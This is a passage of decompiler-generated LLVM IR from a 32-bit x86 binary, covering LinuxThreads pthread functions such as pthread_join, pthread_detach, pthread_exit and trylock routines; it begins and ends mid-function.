  uselistorder i32 %v3_805a606, { 2, 1, 0 }
  uselistorder i32 %v0_805a5f2, { 1, 0 }
  uselistorder i32 %v2_805a595, { 2, 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 (i32)* @__pthread_restart_new, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 428, { 2, 0, 1 }
  uselistorder i32 424, { 2, 0, 1 }
  uselistorder i32 416, { 2, 0, 1 }
  uselistorder i32 412, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805a67e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a628, { 1, 0 }
  uselistorder label %dec_label_pc_805a603, { 2, 0, 1 }
}

define i32 @pthread_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_805a68b = ptrtoint i32* %stack_var_0 to i32
  %v2_805a694 = call i32 @__pthread_do_exit(i32 %arg1, i32 %v2_805a68b)
  ret i32 %v2_805a694
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805a69b = load i32, i32* @esi, align 4
  %v0_805a69c = load i32, i32* @ebx, align 4
  store i32 %v0_805a69c, i32* %stack_var_-16, align 4
  %v4_805a69c = ptrtoint i32* %stack_var_-16 to i32
  %v2_805a6a3 = call i32 @thread_self.16(i32 %v0_805a69c, i32 %v0_805a69b)
  store i32 %arg1, i32* @ebp, align 4
  %v1_805a6c3 = urem i32 %arg1, 1024
  store i32 %v2_805a6a3, i32* @edx, align 4
  %v2_805a6cf = mul nuw nsw i32 %v1_805a6c3, 16
  %v1_805a6d2 = add i32 %v2_805a6cf, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_805a6d2, i32* @esi, align 4
  store i32 %v1_805a6d2, i32* @eax, align 4
  store i32 %v1_805a6d2, i32* %stack_var_-28, align 4
  %v1_805a6e1 = call i32 @__pthread_lock(i32 %v1_805a6d2)
  %v0_805a6e6 = load i32, i32* @esi, align 4
  %v1_805a6e6 = add i32 %v0_805a6e6, 8
  %v2_805a6e6 = inttoptr i32 %v1_805a6e6 to i32*
  %v3_805a6e6 = load i32, i32* %v2_805a6e6, align 4
  store i32 %v3_805a6e6, i32* @ebx, align 4
  %v1_805a6e9 = icmp eq i32 %v3_805a6e6, 0
  br i1 %v1_805a6e9, label %dec_label_pc_805a6f2, label %dec_label_pc_805a6ed

dec_label_pc_805a6ed:                             ; preds = %entry
  %v1_805a6ed = add i32 %v3_805a6e6, 16
  %v2_805a6ed = inttoptr i32 %v1_805a6ed to i32*
  %v3_805a6ed = load i32, i32* %v2_805a6ed, align 4
  %v4_805a6ed = load i32, i32* @ebp, align 4
  %v15_805a6ed = icmp eq i32 %v3_805a6ed, %v4_805a6ed
  br i1 %v15_805a6ed, label %dec_label_pc_805a702, label %dec_label_pc_805a6f2

dec_label_pc_805a6f2:                             ; preds = %dec_label_pc_805a6ed, %entry
  store i32 %v0_805a6e6, i32* %stack_var_-204, align 4
  %v1_805a6f6 = inttoptr i32 %v0_805a6e6 to i32*
  %v2_805a6f6 = call i32 @__pthread_unlock(i32* %v1_805a6f6)
  br label %dec_label_pc_805a71b

dec_label_pc_805a702:                             ; preds = %dec_label_pc_805a6ed
  %v12_805a709 = icmp eq i32 %v3_805a6e6, %v2_805a6a3
  %v1_805a70b = icmp eq i1 %v12_805a709, false
  br i1 %v1_805a70b, label %dec_label_pc_805a723, label %dec_label_pc_805a70d

dec_label_pc_805a70d:                             ; preds = %dec_label_pc_805a702
  store i32 %v0_805a6e6, i32* %stack_var_-204, align 4
  %v1_805a711 = inttoptr i32 %v0_805a6e6 to i32*
  %v2_805a711 = call i32 @__pthread_unlock(i32* %v1_805a711)
  br label %dec_label_pc_805a71b

dec_label_pc_805a71b:                             ; preds = %dec_label_pc_805a72f, %dec_label_pc_805a6f2, %dec_label_pc_805a70d
  %v0_805a87f4 = phi i32 [ 22, %dec_label_pc_805a72f ], [ 3, %dec_label_pc_805a6f2 ], [ 35, %dec_label_pc_805a70d ]
  br label %dec_label_pc_805a875

dec_label_pc_805a723:                             ; preds = %dec_label_pc_805a702
  %v1_805a723 = add i32 %v3_805a6e6, 45
  %v2_805a723 = inttoptr i32 %v1_805a723 to i8*
  %v3_805a723 = load i8, i8* %v2_805a723, align 1
  %v4_805a723 = icmp eq i8 %v3_805a723, 0
  %v1_805a727 = icmp eq i1 %v4_805a723, false
  br i1 %v1_805a727, label %dec_label_pc_805a72f, label %dec_label_pc_805a729

dec_label_pc_805a729:                             ; preds = %dec_label_pc_805a723
  %v1_805a729 = add i32 %v3_805a6e6, 56
  %v2_805a729 = inttoptr i32 %v1_805a729 to i32*
  %v3_805a729 = load i32, i32* %v2_805a729, align 4
  %v4_805a729 = icmp eq i32 %v3_805a729, 0
  br i1 %v4_805a729, label %dec_label_pc_805a73f, label %dec_label_pc_805a72f

dec_label_pc_805a72f:                             ; preds = %dec_label_pc_805a729, %dec_label_pc_805a723
  store i32 %v0_805a6e6, i32* %stack_var_-204, align 4
  %v1_805a733 = inttoptr i32 %v0_805a6e6 to i32*
  %v2_805a733 = call i32 @__pthread_unlock(i32* %v1_805a733)
  br label %dec_label_pc_805a71b

dec_label_pc_805a73f:                             ; preds = %dec_label_pc_805a729
  %v1_805a73f = add i32 %v3_805a6e6, 44
  %v2_805a73f = inttoptr i32 %v1_805a73f to i8*
  %v3_805a73f = load i8, i8* %v2_805a73f, align 1
  %v4_805a73f = icmp eq i8 %v3_805a73f, 0
  %v1_805a743 = icmp eq i1 %v4_805a73f, false
  br i1 %v1_805a743, label %dec_label_pc_805a80b, label %dec_label_pc_805a749

dec_label_pc_805a749:                             ; preds = %dec_label_pc_805a73f
  store i32 %v2_805a6a3, i32* @eax, align 4
  %v2_805a750 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_805a750, i32* @edx, align 4
  %v0_805a757 = call i32 @__pthread_set_own_extricate_if.15()
  %v1_805a763 = add i32 %v2_805a6a3, 66
  %v2_805a763 = inttoptr i32 %v1_805a763 to i8*
  %v3_805a763 = load i8, i8* %v2_805a763, align 1
  %v4_805a763 = icmp eq i8 %v3_805a763, 0
  br i1 %v4_805a763, label %dec_label_pc_805a77b, label %dec_label_pc_805a769

dec_label_pc_805a769:                             ; preds = %dec_label_pc_805a749
  store i32 1, i32* @edi, align 4
  %v1_805a775 = add i32 %v2_805a6a3, 64
  %v2_805a775 = inttoptr i32 %v1_805a775 to i8*
  %v3_805a775 = load i8, i8* %v2_805a775, align 1
  %v4_805a775 = icmp eq i8 %v3_805a775, 0
  br i1 %v4_805a775, label %dec_label_pc_805a787, label %dec_label_pc_805a77b

dec_label_pc_805a77b:                             ; preds = %dec_label_pc_805a769, %dec_label_pc_805a749
  store i32 0, i32* @edi, align 4
  store i32 %v2_805a6a3, i32* %v2_805a729, align 4
  br label %dec_label_pc_805a787

dec_label_pc_805a787:                             ; preds = %dec_label_pc_805a769, %dec_label_pc_805a77b
  %v0_805a78a = load i32, i32* @esi, align 4
  store i32 %v0_805a78a, i32* %stack_var_-204, align 4
  %v1_805a78b = inttoptr i32 %v0_805a78a to i32*
  %v2_805a78b = call i32 @__pthread_unlock(i32* %v1_805a78b)
  %v0_805a793 = load i32, i32* @edi, align 4
  %v1_805a793 = icmp eq i32 %v0_805a793, 0
  store i32 %v2_805a6a3, i32* @eax, align 4
  br i1 %v1_805a793, label %dec_label_pc_805a7a7, label %dec_label_pc_805a797

dec_label_pc_805a797:                             ; preds = %dec_label_pc_805a787
  store i32 0, i32* @edx, align 4
  %v0_805a7a0 = call i32 @__pthread_set_own_extricate_if.15()
  br label %dec_label_pc_805a7ec

dec_label_pc_805a7a7:                             ; preds = %dec_label_pc_805a787
  %v0_805a7ae = call i32 @suspend.17()
  store i32 %v2_805a6a3, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_805a7bc = call i32 @__pthread_set_own_extricate_if.15()
  %v1_805a7c8 = add i32 %v2_805a6a3, 440
  %v2_805a7c8 = inttoptr i32 %v1_805a7c8 to i8*
  %v3_805a7c8 = load i8, i8* %v2_805a7c8, align 1
  %v4_805a7c8 = icmp eq i8 %v3_805a7c8, 0
  br i1 %v4_805a7c8, label %dec_label_pc_805a7fd, label %dec_label_pc_805a7d1

dec_label_pc_805a7d1:                             ; preds = %dec_label_pc_805a7a7
  %v1_805a7d8 = add i32 %v2_805a6a3, 64
  %v2_805a7d8 = inttoptr i32 %v1_805a7d8 to i8*
  %v3_805a7d8 = load i8, i8* %v2_805a7d8, align 1
  %v4_805a7d8 = icmp eq i8 %v3_805a7d8, 0
  %v1_805a7dc = icmp eq i1 %v4_805a7d8, false
  br i1 %v1_805a7dc, label %dec_label_pc_805a7fd, label %dec_label_pc_805a7de

dec_label_pc_805a7de:                             ; preds = %dec_label_pc_805a7d1
  store i8 0, i8* %v2_805a7c8, align 1
  br label %dec_label_pc_805a7ec

dec_label_pc_805a7ec:                             ; preds = %dec_label_pc_805a797, %dec_label_pc_805a7de
  store i32 -1, i32* %stack_var_-204, align 4
  %v2_805a7f8 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805a69c)
  br label %dec_label_pc_805a7fd

dec_label_pc_805a7fd:                             ; preds = %dec_label_pc_805a7d1, %dec_label_pc_805a7a7, %dec_label_pc_805a7ec
  store i32 %v2_805a6a3, i32* @edx, align 4
  %v0_805a804 = load i32, i32* @esi, align 4
  store i32 %v0_805a804, i32* @eax, align 4
  %v0_805a806 = load i32, i32* %stack_var_-204, align 4
  %v1_805a806 = call i32 @__pthread_lock(i32 %v0_805a806)
  br label %dec_label_pc_805a80b

dec_label_pc_805a80b:                             ; preds = %dec_label_pc_805a73f, %dec_label_pc_805a7fd
  %v4_805a80b = icmp eq i32* %arg2, null
  br i1 %v4_805a80b, label %dec_label_pc_805a821, label %dec_label_pc_805a815

dec_label_pc_805a815:                             ; preds = %dec_label_pc_805a80b
  %v1_805a815 = add i32 %v3_805a6e6, 48
  %v2_805a815 = inttoptr i32 %v1_805a815 to i32*
  %v3_805a815 = load i32, i32* %v2_805a815, align 4
  store i32 %v3_805a815, i32* %arg2, align 4
  br label %dec_label_pc_805a821

dec_label_pc_805a821:                             ; preds = %dec_label_pc_805a80b, %dec_label_pc_805a815
  %v0_805a824 = load i32, i32* @esi, align 4
  store i32 %v0_805a824, i32* %stack_var_-204, align 4
  %v1_805a825 = inttoptr i32 %v0_805a824 to i32*
  %v2_805a825 = call i32 @__pthread_unlock(i32* %v1_805a825)
  %v0_805a82d = load i32, i32* @global_var_8075304.574, align 4
  %v2_805a82d = icmp slt i32 %v0_805a82d, 0
  br i1 %v2_805a82d, label %dec_label_pc_805a873, label %dec_label_pc_805a836

dec_label_pc_805a836:                             ; preds = %dec_label_pc_805a821
  store i32 %v2_805a6a3, i32* %stack_var_-176, align 4
  %v2_805a84d = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_805a84d

dec_label_pc_805a84d:                             ; preds = %dec_label_pc_805a869.dec_label_pc_805a84d_crit_edge, %dec_label_pc_805a836
  %v0_805a858 = phi i32 [ %v0_805a858.pre, %dec_label_pc_805a869.dec_label_pc_805a84d_crit_edge ], [ %v0_805a82d, %dec_label_pc_805a836 ]
  store i32 %v0_805a858, i32* %stack_var_-204, align 4
  %v3_805a85e = call i32 @__libc_write(i32 %v0_805a858, i32 %v2_805a84d, i32 148)
  %v8_805a866 = icmp eq i32 %v3_805a85e, -1
  %v1_805a867 = icmp eq i1 %v8_805a866, false
  br i1 %v1_805a867, label %dec_label_pc_805a873, label %dec_label_pc_805a869

dec_label_pc_805a869:                             ; preds = %dec_label_pc_805a84d
  %v0_805a869 = load i32, i32* %stack_var_-204, align 4
  %v1_805a869 = call i32 @__errno_location(i32 %v0_805a869)
  %v1_805a86e = inttoptr i32 %v1_805a869 to i32*
  %v2_805a86e = load i32, i32* %v1_805a86e, align 4
  %v11_805a86e = icmp eq i32 %v2_805a86e, 4
  br i1 %v11_805a86e, label %dec_label_pc_805a869.dec_label_pc_805a84d_crit_edge, label %dec_label_pc_805a869.dec_label_pc_805a873.loopexit_crit_edge

dec_label_pc_805a869.dec_label_pc_805a873.loopexit_crit_edge: ; preds = %dec_label_pc_805a869
  br label %dec_label_pc_805a873

dec_label_pc_805a869.dec_label_pc_805a84d_crit_edge: ; preds = %dec_label_pc_805a869
  %v0_805a858.pre = load i32, i32* @global_var_8075304.574, align 4
  br label %dec_label_pc_805a84d

dec_label_pc_805a873:                             ; preds = %dec_label_pc_805a84d, %dec_label_pc_805a869.dec_label_pc_805a873.loopexit_crit_edge, %dec_label_pc_805a821
  br label %dec_label_pc_805a875

dec_label_pc_805a875:                             ; preds = %dec_label_pc_805a71b, %dec_label_pc_805a873
  %v0_805a87f = phi i32 [ %v0_805a87f4, %dec_label_pc_805a71b ], [ 0, %dec_label_pc_805a873 ]
  ret i32 %v0_805a87f

; uselistorder directives
  uselistorder i32 %v0_805a858, { 1, 0 }
  uselistorder i32 %v3_805a6e6, { 2, 5, 4, 1, 0, 3, 6, 7 }
  uselistorder i32 %v0_805a6e6, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32 %v2_805a6a3, { 10, 4, 3, 5, 7, 6, 1, 2, 9, 8, 0, 11 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-204, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 2, 1, 4, 9, 8, 0, 7, 3, 11, 6, 5, 10 }
  uselistorder i32 440, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 ()* @suspend.17, { 1, 0 }
  uselistorder i32 ()* @__pthread_set_own_extricate_if.15, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a875, { 1, 0 }
  uselistorder label %dec_label_pc_805a873, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a821, { 1, 0 }
  uselistorder label %dec_label_pc_805a80b, { 1, 0 }
  uselistorder label %dec_label_pc_805a7fd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_805a787, { 1, 0 }
  uselistorder label %dec_label_pc_805a71b, { 0, 2, 1 }
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  store i32 0, i32* @edx, align 4
  %v0_805a884 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805a894 = urem i32 %arg1, 1024
  %v2_805a899 = mul nuw nsw i32 %v1_805a894, 16
  %v1_805a89c = add i32 %v2_805a899, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_805a89c, i32* @esi, align 4
  store i32 %v1_805a89c, i32* @eax, align 4
  %v1_805a8a4 = call i32 @__pthread_lock(i32 %v0_805a884)
  %v0_805a8a9 = load i32, i32* @esi, align 4
  %v1_805a8a9 = add i32 %v0_805a8a9, 8
  %v2_805a8a9 = inttoptr i32 %v1_805a8a9 to i32*
  %v3_805a8a9 = load i32, i32* %v2_805a8a9, align 4
  %v1_805a8ac = icmp eq i32 %v3_805a8a9, 0
  br i1 %v1_805a8ac, label %dec_label_pc_805a8b5, label %dec_label_pc_805a8b0

dec_label_pc_805a8b0:                             ; preds = %entry
  %v1_805a8b0 = add i32 %v3_805a8a9, 16
  %v2_805a8b0 = inttoptr i32 %v1_805a8b0 to i32*
  %v3_805a8b0 = load i32, i32* %v2_805a8b0, align 4
  %v4_805a8b0 = load i32, i32* @edi, align 4
  %v15_805a8b0 = icmp eq i32 %v3_805a8b0, %v4_805a8b0
  br i1 %v15_805a8b0, label %dec_label_pc_805a8c5, label %dec_label_pc_805a8b5

dec_label_pc_805a8b5:                             ; preds = %dec_label_pc_805a8b0, %entry
  store i32 %v0_805a8a9, i32* %stack_var_-188, align 4
  %v1_805a8b9 = inttoptr i32 %v0_805a8a9 to i32*
  %v2_805a8b9 = call i32 @__pthread_unlock(i32* %v1_805a8b9)
  br label %dec_label_pc_805a8d9

dec_label_pc_805a8c5:                             ; preds = %dec_label_pc_805a8b0
  %v1_805a8c5 = add i32 %v3_805a8a9, 45
  %v2_805a8c5 = inttoptr i32 %v1_805a8c5 to i8*
  %v3_805a8c5 = load i8, i8* %v2_805a8c5, align 1
  %v4_805a8c5 = icmp eq i8 %v3_805a8c5, 0
  br i1 %v4_805a8c5, label %dec_label_pc_805a8de, label %dec_label_pc_805a8cb

dec_label_pc_805a8cb:                             ; preds = %dec_label_pc_805a8c5
  store i32 %v0_805a8a9, i32* %stack_var_-188, align 4
  %v1_805a8cf = inttoptr i32 %v0_805a8a9 to i32*
  %v2_805a8cf = call i32 @__pthread_unlock(i32* %v1_805a8cf)
  br label %dec_label_pc_805a8d9

dec_label_pc_805a8d9:                             ; preds = %dec_label_pc_805a8e4, %dec_label_pc_805a8b5, %dec_label_pc_805a8cb
  %v0_805a9583 = phi i32 [ 0, %dec_label_pc_805a8e4 ], [ 3, %dec_label_pc_805a8b5 ], [ 22, %dec_label_pc_805a8cb ]
  br label %dec_label_pc_805a94f

dec_label_pc_805a8de:                             ; preds = %dec_label_pc_805a8c5
  %v1_805a8de = add i32 %v3_805a8a9, 56
  %v2_805a8de = inttoptr i32 %v1_805a8de to i32*
  %v3_805a8de = load i32, i32* %v2_805a8de, align 4
  %v4_805a8de = icmp eq i32 %v3_805a8de, 0
  br i1 %v4_805a8de, label %dec_label_pc_805a8f1, label %dec_label_pc_805a8e4

dec_label_pc_805a8e4:                             ; preds = %dec_label_pc_805a8de
  store i32 %v0_805a8a9, i32* %stack_var_-188, align 4
  %v1_805a8e8 = inttoptr i32 %v0_805a8a9 to i32*
  %v2_805a8e8 = call i32 @__pthread_unlock(i32* %v1_805a8e8)
  br label %dec_label_pc_805a8d9

dec_label_pc_805a8f1:                             ; preds = %dec_label_pc_805a8de
  %v1_805a8f1 = add i32 %v3_805a8a9, 44
  %v2_805a8f1 = inttoptr i32 %v1_805a8f1 to i8*
  %v3_805a8f1 = load i8, i8* %v2_805a8f1, align 1
  %v4_805a8f1 = sext i8 %v3_805a8f1 to i32
  store i32 %v4_805a8f1, i32* @ebx, align 4
  store i8 1, i8* %v2_805a8c5, align 1
  %v0_805a8fc = load i32, i32* @esi, align 4
  store i32 %v0_805a8fc, i32* %stack_var_-188, align 4
  %v1_805a8fd = inttoptr i32 %v0_805a8fc to i32*
  %v2_805a8fd = call i32 @__pthread_unlock(i32* %v1_805a8fd)
  %v1_805a905 = icmp eq i8 %v3_805a8f1, 0
  br i1 %v1_805a905, label %dec_label_pc_805a94d, label %dec_label_pc_805a909

dec_label_pc_805a909:                             ; preds = %dec_label_pc_805a8f1
  %v0_805a909 = load i32, i32* @global_var_8075304.574, align 4
  %v2_805a909 = icmp slt i32 %v0_805a909, 0
  br i1 %v2_805a909, label %dec_label_pc_805a94d, label %dec_label_pc_805a912

dec_label_pc_805a912:                             ; preds = %dec_label_pc_805a909
  %v0_805a912 = load i32, i32* %stack_var_-188, align 4
  %v2_805a912 = call i32 @thread_self.16(i32 %v0_805a912, i32 %tmp13)
  store i32 %v2_805a912, i32* %stack_var_-160, align 4
  %v2_805a927 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_805a927

dec_label_pc_805a927:                             ; preds = %dec_label_pc_805a943, %dec_label_pc_805a912
  %v0_805a932 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_805a932, i32* %stack_var_-188, align 4
  %v3_805a938 = call i32 @__libc_write(i32 %v0_805a932, i32 %v2_805a927, i32 148)
  %v8_805a940 = icmp eq i32 %v3_805a938, -1
  %v1_805a941 = icmp eq i1 %v8_805a940, false
  br i1 %v1_805a941, label %dec_label_pc_805a94d, label %dec_label_pc_805a943

dec_label_pc_805a943:                             ; preds = %dec_label_pc_805a927
  %v0_805a943 = load i32, i32* %stack_var_-188, align 4
  %v1_805a943 = call i32 @__errno_location(i32 %v0_805a943)
  %v1_805a948 = inttoptr i32 %v1_805a943 to i32*
  %v2_805a948 = load i32, i32* %v1_805a948, align 4
  %v11_805a948 = icmp eq i32 %v2_805a948, 4
  br i1 %v11_805a948, label %dec_label_pc_805a927, label %dec_label_pc_805a943.dec_label_pc_805a94d.loopexit_crit_edge

dec_label_pc_805a943.dec_label_pc_805a94d.loopexit_crit_edge: ; preds = %dec_label_pc_805a943
  br label %dec_label_pc_805a94d

dec_label_pc_805a94d:                             ; preds = %dec_label_pc_805a927, %dec_label_pc_805a943.dec_label_pc_805a94d.loopexit_crit_edge, %dec_label_pc_805a909, %dec_label_pc_805a8f1
  br label %dec_label_pc_805a94f

dec_label_pc_805a94f:                             ; preds = %dec_label_pc_805a8d9, %dec_label_pc_805a94d
  %v0_805a958 = phi i32 [ %v0_805a9583, %dec_label_pc_805a8d9 ], [ 0, %dec_label_pc_805a94d ]
  ret i32 %v0_805a958

; uselistorder directives
  uselistorder i32 %v3_805a8a9, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_805a8a9, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %stack_var_-188, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 (i32, i32)* @thread_self.16, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805a94f, { 1, 0 }
  uselistorder label %dec_label_pc_805a94d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805a8d9, { 0, 2, 1 }
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_805a960 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_805a960, i32* %ebx.global-to-local, align 4
  %v2_805a965 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_805a96f = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_805a98e9 = icmp eq i32 %storemerge8, 0
  %v1_805a99411 = icmp eq i1 %v1_805a98e9, false
  br i1 %v1_805a99411, label %dec_label_pc_805a97c, label %dec_label_pc_805a996

dec_label_pc_805a97c:                             ; preds = %entry, %dec_label_pc_805a97c
  %storemerge12 = phi i32 [ %storemerge, %dec_label_pc_805a97c ], [ %storemerge8, %entry ]
  %v1_805a97f = add i32 %storemerge12, 56
  %v3_805a983 = call i32 @pthread_mutex_init(i32 %v1_805a97f, i32* nonnull %stack_var_-8)
  %v0_805a988 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a988 = add i32 %v0_805a988, 32
  %v2_805a988 = inttoptr i32 %v1_805a988 to i32*
  %storemerge = load i32, i32* %v2_805a988, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_805a98e = icmp eq i32 %storemerge, 0
  %v1_805a994 = icmp eq i1 %v1_805a98e, false
  br i1 %v1_805a994, label %dec_label_pc_805a97c, label %dec_label_pc_805a996

dec_label_pc_805a996:                             ; preds = %dec_label_pc_805a97c, %entry
  %v1_805a99a = call i32 @pthread_mutexattr_destroy(i32 %v2_805a960)
  ret i32 %v1_805a99a

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a97c, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a9a4 = load i32, i32* @ebx, align 4
  store i32 %v0_805a9a4, i32* %stack_var_-4, align 4
  %v0_805a9a5 = load i32, i32* @eax, align 4
  store i32 %v0_805a9a5, i32* %ecx.global-to-local, align 4
  %v1_805a9aa11 = inttoptr i32 %v0_805a9a5 to i32*
  %v2_805a9aa12 = load i32, i32* %v1_805a9aa11, align 4
  %v3_805a9aa13 = icmp eq i32 %v2_805a9aa12, 0
  br i1 %v3_805a9aa13, label %dec_label_pc_805a9b6, label %dec_label_pc_805a9cc.loopexit

dec_label_pc_805a9b6:                             ; preds = %entry, %dec_label_pc_805a9b6.dec_label_pc_805a9aa_crit_edge
  %v1_805a9aa14 = phi i32* [ %v1_805a9aa, %dec_label_pc_805a9b6.dec_label_pc_805a9aa_crit_edge ], [ %v1_805a9aa11, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805a9bf = load i32, i32* %v1_805a9aa14, align 4
  %v15_805a9bf = icmp eq i32 %v2_805a9bf, 0
  %v22_805a9bf = select i1 %v15_805a9bf, i32 1, i32 %v2_805a9bf
  store i32 %v22_805a9bf, i32* %v1_805a9aa14, align 4
  %v1_805a9c3 = zext i1 %v15_805a9bf to i32
  %v2_805a9c3 = load i32, i32* %edx.global-to-local, align 4
  %v3_805a9c3 = and i32 %v2_805a9c3, -256
  %v4_805a9c3 = or i32 %v3_805a9c3, %v1_805a9c3
  store i32 %v4_805a9c3, i32* %edx.global-to-local, align 4
  %v4_805a9c6 = icmp eq i1 %v15_805a9bf, false
  br i1 %v4_805a9c6, label %dec_label_pc_805a9b6.dec_label_pc_805a9aa_crit_edge, label %dec_label_pc_805a9ca

dec_label_pc_805a9b6.dec_label_pc_805a9aa_crit_edge: ; preds = %dec_label_pc_805a9b6
  %v0_805a9aa.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a9aa = inttoptr i32 %v0_805a9aa.pre to i32*
  %v2_805a9aa = load i32, i32* %v1_805a9aa, align 4
  %v3_805a9aa = icmp eq i32 %v2_805a9aa, 0
  br i1 %v3_805a9aa, label %dec_label_pc_805a9b6, label %dec_label_pc_805a9cc.loopexit

dec_label_pc_805a9ca:                             ; preds = %dec_label_pc_805a9b6
  br label %dec_label_pc_805a9cc

dec_label_pc_805a9cc.loopexit:                    ; preds = %dec_label_pc_805a9b6.dec_label_pc_805a9aa_crit_edge, %entry
  br label %dec_label_pc_805a9cc

dec_label_pc_805a9cc:                             ; preds = %dec_label_pc_805a9cc.loopexit, %dec_label_pc_805a9ca
  %storemerge = phi i32 [ 16, %dec_label_pc_805a9cc.loopexit ], [ 0, %dec_label_pc_805a9ca ]
  %v2_805a9cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a9cc, i32* @edx, align 4
  %v2_805a9cd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a9cd, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_805a9aa, { 1, 0 }
  uselistorder i1 %v15_805a9bf, { 1, 0, 2 }
  uselistorder i32 %v2_805a9bf, { 1, 0 }
  uselistorder i32* %v1_805a9aa14, { 1, 0 }
  uselistorder label %dec_label_pc_805a9b6, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a9cf = load i32, i32* @ebx, align 4
  store i32 %v0_805a9cf, i32* %stack_var_-4, align 4
  %v0_805a9d0 = load i32, i32* @eax, align 4
  store i32 %v0_805a9d0, i32* %ecx.global-to-local, align 4
  %v1_805a9d511 = inttoptr i32 %v0_805a9d0 to i32*
  %v2_805a9d512 = load i32, i32* %v1_805a9d511, align 4
  %v3_805a9d513 = icmp eq i32 %v2_805a9d512, 0
  br i1 %v3_805a9d513, label %dec_label_pc_805a9e1, label %dec_label_pc_805a9f7.loopexit

dec_label_pc_805a9e1:                             ; preds = %entry, %dec_label_pc_805a9e1.dec_label_pc_805a9d5_crit_edge
  %v1_805a9d514 = phi i32* [ %v1_805a9d5, %dec_label_pc_805a9e1.dec_label_pc_805a9d5_crit_edge ], [ %v1_805a9d511, %entry ]
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805a9ea = load i32, i32* %v1_805a9d514, align 4
  %v15_805a9ea = icmp eq i32 %v2_805a9ea, 0
  %v22_805a9ea = select i1 %v15_805a9ea, i32 1, i32 %v2_805a9ea
  store i32 %v22_805a9ea, i32* %v1_805a9d514, align 4
  %v1_805a9ee = zext i1 %v15_805a9ea to i32
  %v2_805a9ee = load i32, i32* %edx.global-to-local, align 4
  %v3_805a9ee = and i32 %v2_805a9ee, -256
  %v4_805a9ee = or i32 %v3_805a9ee, %v1_805a9ee
  store i32 %v4_805a9ee, i32* @edx, align 4
  %v4_805a9f1 = icmp eq i1 %v15_805a9ea, false
  br i1 %v4_805a9f1, label %dec_label_pc_805a9e1.dec_label_pc_805a9d5_crit_edge, label %dec_label_pc_805a9f5

dec_label_pc_805a9e1.dec_label_pc_805a9d5_crit_edge: ; preds = %dec_label_pc_805a9e1
  %v0_805a9d5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a9d5 = inttoptr i32 %v0_805a9d5.pre to i32*
